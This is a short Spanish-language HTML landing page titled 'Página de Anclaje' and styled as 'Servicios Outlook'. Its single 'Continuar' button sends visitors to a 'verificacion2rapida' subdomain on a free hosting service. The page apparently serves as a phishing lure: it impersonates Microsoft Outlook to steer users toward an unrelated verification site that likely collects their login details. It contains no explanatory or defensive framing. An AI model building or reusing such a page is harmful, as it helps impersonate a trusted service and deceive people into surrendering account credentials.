<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Página de Anclaje</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: url("images/fondo.png") no-repeat center center fixed;
      background-size: cover;
      color: white;
      text-align: center;
    }
    .container {
      background: rgba(0, 0, 0, 0.5); /* capa semitransparente */
      padding: 40px;
      border-radius: 10px;
    }
    h1 {
      font-size: 2.5em;
      margin-bottom: 10px;
    }
    p {
      font-size: 1.2em;
      margin-bottom: 20px;
    }
    .btn {
      display: inline-block;
      background: #0078d7;
      color: white;
      padding: 12px 24px;
      border-radius: 6px;
      text-decoration: none;
      font-size: 1.1em;
      transition: background 0.3s;
    }
    .btn:hover {
      background: #005a9e;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Servicios Outlook</h1>
    <p>Quédate con nosotros.</p>
    <a href="http://verificacion2rapida.iceiy.com/" class="btn">Continuar</a>
  </div>
</body>
</html>
